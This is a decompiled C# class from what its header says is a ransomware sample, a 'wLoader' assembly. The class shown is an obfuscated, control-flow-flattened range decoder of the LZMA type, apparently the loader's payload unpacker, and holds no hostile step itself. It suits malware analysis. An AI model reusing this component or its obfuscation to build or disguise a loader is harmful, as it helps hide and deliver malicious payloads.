// Decompiled with JetBrains decompiler
// Type: ?14?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using System.IO;

internal sealed class \u003F14\u003F
{
  public uint \u003F0\u003F;
  public uint \u003F5\u003F;
  public Stream \u003F0\u003F;

  public void \u003F0\u003F(Stream _param1)
  {
    this.\u003F0\u003F = _param1;
    int num1 = 0;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          this.\u003F5\u003F = 0U;
          num1 = 1;
          continue;
        case 1:
          this.\u003F0\u003F = uint.MaxValue;
          num1 = 2;
          continue;
        case 2:
          num2 = 0;
          num1 = 3;
          continue;
        case 3:
          if (num2 < 5)
          {
            this.\u003F5\u003F = this.\u003F5\u003F << 8 | (uint) (byte) this.\u003F0\u003F.ReadByte();
            num1 = 4;
            continue;
          }
          goto label_8;
        default:
          ++num2;
          goto case 3;
      }
    }
label_8:;
  }

  public void \u003F0\u003F() => this.\u003F0\u003F = (Stream) null;

  public uint \u003F0\u003F(int _param1)
  {
    uint num1 = this.\u003F0\u003F;
    int num2 = 0;
    uint num3;
    while (true)
    {
      uint num4;
      int num5;
      uint num6;
      switch (num2)
      {
        case 0:
          num4 = this.\u003F5\u003F;
          num2 = 1;
          continue;
        case 1:
          num3 = 0U;
          num2 = 2;
          continue;
        case 2:
          num5 = _param1;
          num2 = 3;
          continue;
        case 3:
label_12:
          if (num5 > 0)
          {
            num1 >>= 1;
            num2 = 4;
            continue;
          }
          this.\u003F0\u003F = num1;
          num2 = 9;
          continue;
        case 4:
          num6 = num4 - num1 >> 31;
          num2 = 5;
          continue;
        case 5:
          num4 -= num1 & num6 - 1U;
          num2 = 6;
          continue;
        case 6:
          num3 = (uint) ((int) num3 << 1 | 1 - (int) num6);
          num2 = 7;
          continue;
        case 7:
          if (num1 < 16777216U)
          {
            num4 = num4 << 8 | (uint) (byte) this.\u003F0\u003F.ReadByte();
            num2 = 8;
            continue;
          }
          break;
        case 8:
          num1 <<= 8;
          break;
        case 9:
          this.\u003F5\u003F = num4;
          num2 = 10;
          continue;
        default:
          goto label_16;
      }
      --num5;
      goto label_12;
    }
label_16:
    return num3;
  }
}
